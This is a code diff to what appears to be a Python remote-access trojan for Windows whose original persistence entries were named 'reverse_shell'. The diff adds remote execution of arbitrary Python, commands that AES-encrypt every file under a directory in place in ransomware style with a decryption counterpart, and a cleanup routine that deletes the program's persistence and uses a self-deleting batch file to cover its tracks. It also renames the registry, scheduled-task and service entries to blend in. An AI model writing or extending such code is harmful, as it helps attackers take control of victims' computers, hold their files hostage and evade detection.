@@ -5,6 +5,7 @@ import contextlib
 import ctypes
 import datetime
 import inspect
+import io
 import json
 import locale
 import os
@@ -40,6 +41,7 @@ import win32service
 import win32ts
 import wmi
 from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 
 import askpass
 import filewatch
@@ -50,6 +52,7 @@ import wer
 
 TEMP_DIR = os.path.expanduser('~') + r'\AppData\Local\Temp'
 EXECUTABLE_PATH = os.path.realpath(sys.executable)
+PROG_NAME = pathlib.Path(EXECUTABLE_PATH).stem
 
 
 class Client:
@@ -331,6 +334,16 @@ class Command:
             return 0, '[-] Error: {}'.format(exception)
 
     @staticmethod
+    def pyexec(code):
+        try:
+            f = io.StringIO()
+            with contextlib.redirect_stdout(f):
+                exec(code)
+            return 1, f.getvalue()
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
     def persistence_startup():
         try:
             exec_copy = os.path.join(
@@ -346,7 +359,7 @@ class Command:
         try:
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                  winreg.KEY_WRITE)
-            winreg.SetValueEx(key, 'reverse_shell', 0, winreg.REG_SZ, EXECUTABLE_PATH)
+            winreg.SetValueEx(key, PROG_NAME, 0, winreg.REG_SZ, EXECUTABLE_PATH)
             winreg.CloseKey(key)
             return 1, '[+] Create registry key success'
         except Exception as exception:
@@ -357,8 +370,8 @@ class Command:
         try:
             if ctypes.windll.shell32.IsUserAnAdmin():
                 cmd = subprocess.Popen(
-                    'schtasks.exe /create /tn reverse_shell /sc onlogon /ru system /rl highest /tr {0} /f'.format(
-                        EXECUTABLE_PATH),
+                    'schtasks.exe /create /tn {} /sc onlogon /ru system /rl highest /tr {} /f'.format(PROG_NAME,
+                                                                                                      EXECUTABLE_PATH),
                     shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 return 1, '[+] Schedule task success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                               locale.getdefaultlocale()[1])
@@ -372,7 +385,7 @@ class Command:
         try:
             if ctypes.windll.shell32.IsUserAnAdmin():
                 cmd = subprocess.Popen(
-                    'sc create reverse_shell binpath= \"{0}\" start= auto'.format(EXECUTABLE_PATH),
+                    'sc create {} binpath= \"{}\" start= auto'.format(PROG_NAME, EXECUTABLE_PATH),
                     shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 return 1, '[+] Create service success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                                locale.getdefaultlocale()[1])
@@ -567,7 +580,7 @@ class Command:
             startup = []
             for s in c.Win32_StartupCommand():
                 startup.append([s.Caption, s.Command, s.Location])
-            return 1, tabulate.tabulate(sorted(startup), headers=['Caption', 'Command', 'Location'])
+            return 1, tabulate.tabulate(sorted(startup), headers=['Caption', 'Command', 'Location']) + os.linesep
         except Exception as exception:
             return 0, '[-] {}'.format(exception)
 
@@ -580,7 +593,7 @@ class Command:
                          (winreg.HKEY_CURRENT_USER, 0)):
                 software_list += Helper.enum_uninstall_key(*item)
             return 1, tabulate.tabulate(sorted(software_list, key=lambda s: s[0].lower()),
-                                        headers=['Name', 'Version', 'Publisher'])
+                                        headers=['Name', 'Version', 'Publisher']) + os.linesep
         except Exception as exception:
             return 0, '[-] Error: ' + str(exception)
 
@@ -824,6 +837,52 @@ class Command:
         return 1, '[+] Success'
 
     @staticmethod
+    def encrypt(path=None):
+        try:
+            key = get_random_bytes(32)
+            with open(TEMP_DIR + r'\encrypted.bin', 'wb') as f:
+                f.write(key)
+            if not path:
+                path = os.getcwd()
+            if os.path.isfile(path):
+                Helper.encrypt_file(path, key)
+            elif os.path.isdir(path):
+                for root, subdirs, files in os.walk(path):
+                    for filename in files:
+                        try:
+                            Helper.encrypt_file(os.path.join(root, filename), key)
+                        except:
+                            pass
+            else:
+                return 0, '[-] No such file or directory'
+            return 1, base64.b64encode(key).decode()
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def decrypt(args):
+        try:
+            status, result = Helper.parse_arguments({'path': False, 'key': True}, args)
+            if not status:
+                return 0, '[-] Error: {}'.format(result)
+            path = result['path'] if result['path'] else os.getcwd()
+            key = base64.b64decode(result['key'])
+            if os.path.isfile(path):
+                Helper.decrypt_file(path, key)
+            elif os.path.isdir(path):
+                for root, subdirs, files in os.walk(path):
+                    for filename in files:
+                        try:
+                            Helper.decrypt_file(os.path.join(root, filename), key)
+                        except:
+                            pass
+            else:
+                return 0, '[-] No such file or directory'
+            return 1, '[+] Success'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
     def freeze(flag):
         try:
             flag = flag.lower() in ('true', '1', '')
@@ -869,6 +928,33 @@ class Command:
             return 1, result
         except Exception as exception:
             return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def cleanup(client):
+        try:
+            cmd_list = [
+                r'del "{}" /f'.format(os.path.join(
+                    os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup',
+                    os.path.basename(EXECUTABLE_PATH))),
+                r'reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "{}" /f'.format(
+                    PROG_NAME),
+                r'schtasks.exe /delete /tn {} /f'.format(PROG_NAME),
+                r'sc stop {}'.format(PROG_NAME),
+                r'sc delete {}'.format(PROG_NAME)
+            ]
+            result = ''
+            for cmd in cmd_list:
+                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
+            if getattr(sys, 'frozen', False):
+                with open(TEMP_DIR + r'\cleanup.bat', 'w') as f:
+                    f.write(
+                        f'@echo off\n:loop\ntimeout /t 2 /nobreak >nul\ndel /f "{EXECUTABLE_PATH}"\nif exist "{EXECUTABLE_PATH}" goto loop\ndel /f %~f0')
+            client.send_text(1, result)
+            Command.hiderun(TEMP_DIR + r'\cleanup.bat')
+            Command.pkill(os.path.basename(EXECUTABLE_PATH))
+        except Exception as exception:
+            client.send_text(0, '[-] Error: {}'.format(exception))
 
     @staticmethod
     def hideme():
@@ -1172,6 +1258,38 @@ class Helper:
         for k in d:
             d[k] = ' '.join(d[k]) if d[k] else None
         return 1, d
+
+    @staticmethod
+    def encrypt_file(filename, key, buffer_size=65536):
+        input_file = open(filename, 'rb')
+        output_file = open(filename + '.encrypted', 'wb')
+        cipher = AES.new(key, AES.MODE_CFB)
+        output_file.write(cipher.iv)
+        buffer = input_file.read(buffer_size)
+        while len(buffer) > 0:
+            bytes = cipher.encrypt(buffer)
+            output_file.write(bytes)
+            buffer = input_file.read(buffer_size)
+        input_file.close()
+        output_file.close()
+        os.remove(filename)
+        os.rename(filename + '.encrypted', filename)
+
+    @staticmethod
+    def decrypt_file(filename, key, buffer_size=65536):
+        input_file = open(filename, 'rb')
+        output_file = open(filename + '.decrypted', 'wb')
+        iv = input_file.read(16)
+        cipher = AES.new(key, AES.MODE_CFB, iv=iv)
+        buffer = input_file.read(buffer_size)
+        while len(buffer) > 0:
+            bytes = cipher.decrypt(buffer)
+            output_file.write(bytes)
+            buffer = input_file.read(buffer_size)
+        input_file.close()
+        output_file.close()
+        os.remove(filename)
+        os.rename(filename + '.decrypted', filename)
 
 
 class ArgumentParser(argparse.ArgumentParser):
